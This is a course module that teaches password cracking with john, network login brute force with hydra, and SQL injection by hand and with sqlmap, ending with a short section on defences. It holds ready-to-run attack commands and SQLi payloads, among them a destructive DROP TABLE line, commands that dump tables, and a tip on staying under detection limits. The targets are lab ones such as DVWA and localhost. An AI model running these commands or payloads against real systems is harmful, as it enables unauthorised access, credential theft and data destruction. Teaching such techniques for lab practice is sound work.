# Module 3 – Attacks (Safe Demo Only)

> ⚠️ **STRICT WARNING:** The techniques in this module are for **controlled lab environments only**.
> **NEVER** run these tools against systems you do not own or have explicit written permission to test.
> Unauthorized use is a criminal offence. All demos in this course use localhost, DVWA, or
> officially authorised public targets.

---

## 3.1 Password Attack Types

| Type | Description | Tool |
|------|-------------|------|
| **Brute Force** | Try all combinations | hydra, john |
| **Dictionary** | Try wordlist of common passwords | hydra, john |
| **Rainbow Table** | Pre-computed hash lookup | john |
| **Credential Stuffing** | Use leaked username/password pairs | custom scripts |
| **Password Spraying** | Try one password against many accounts | hydra |

---

## 3.2 Password Hashing

Passwords are stored as hashes, not plain text. Common algorithms:

| Algorithm | Example Hash (of "password") | Status |
|-----------|------------------------------|--------|
| MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Broken |
| SHA-1 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | Weak |
| SHA-256 | `5e884898da28...` | Acceptable |
| bcrypt | `$2b$12$...` | Strong |

---

## 3.3 John the Ripper

`john` cracks password hashes using wordlists or brute force.

```bash
# Crack MD5 hashes with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=raw-md5

# Show cracked passwords
john --show hashes.txt

# List supported formats
john --list=formats

# Create a hash for practice
echo -n "password123" | md5sum
# result: 482c811da5d5b4bc6d497ffa98491e38

# Save hash to file and crack it
echo "user1:482c811da5d5b4bc6d497ffa98491e38" > /tmp/test.hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/test.hash
john --show /tmp/test.hash
```

---

## 3.4 Hydra – Network Login Brute Force

> ⚠️ **Only use against localhost, your own DVWA, or explicitly authorised systems.**

`hydra` tests login credentials across network protocols.

```bash
# SSH brute force on localhost (demo only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh

# HTTP POST form brute force (DVWA)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"

# FTP brute force
hydra -l user -P /tmp/pass.txt 127.0.0.1 ftp

# Common flags
# -l <user>    single username
# -L <file>    username list
# -p <pass>    single password
# -P <file>    password list
# -t 4         threads (keep low to avoid detection)
# -V           verbose output
# -f           stop after first success
```

---

## 3.5 SQL Injection

**SQL Injection (SQLi)** occurs when user input is directly embedded in SQL queries without sanitization.

### How it Works

```
Normal query:  SELECT * FROM users WHERE id = 1
Injected:      SELECT * FROM users WHERE id = 1 OR 1=1 --
```

### Types of SQLi

| Type | Description |
|------|-------------|
| **In-band** | Results returned directly in response |
| **Blind** | Infer results from True/False responses |
| **Time-based** | Use delays (`SLEEP()`) to infer data |
| **Error-based** | Extract data from error messages |
| **Union-based** | Append UNION SELECT to extract data |

### Manual SQLi Payloads (test on DVWA/testphp only)

```
1' OR '1'='1
1' OR 1=1--
1'; DROP TABLE users--     ← ⚠ destructive, never on real sites
' UNION SELECT null, version()--
' UNION SELECT null, table_name FROM information_schema.tables--
```

---

## 3.6 sqlmap

`sqlmap` automates SQL injection detection and exploitation.

```bash
# Test a URL parameter for SQLi
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch

# List databases
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs

# List tables in a database
sqlmap -u "..." --batch -D acuart --tables

# Dump a table
sqlmap -u "..." --batch -D acuart -T users --dump

# POST request
sqlmap -u "http://target/login.php" --data "user=admin&pass=test" --batch

# Flags explained:
# --batch       use defaults, no prompts
# --level       1-5, test depth (default 1)
# --risk        1-3, risk of tests (default 1)
# --dbs         list databases
# --tables      list tables
# --dump        dump table data
# --random-agent  randomise user agent
```

---

## 3.7 Input Validation – Defence

Preventing injection attacks:

```python
# BAD – vulnerable
query = "SELECT * FROM users WHERE id = " + user_input

# GOOD – parameterised query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))
```

Other mitigations:
- Prepared statements / parameterised queries
- Input whitelisting (only allow expected characters)
- WAF (Web Application Firewall)
- Principle of least privilege on DB accounts
- Never show raw error messages to users

---

## Key Takeaways

- Password hashing does not mean uncrackable – use strong algorithms (bcrypt, Argon2)
- Only brute force your own systems or those you have permission to test
- SQLi is still one of the most common web vulnerabilities (OWASP Top 10)
- Always validate and sanitise all user input

---

*Next: [Module 4 – Web Services & IDS](module4_web_ids.md)*
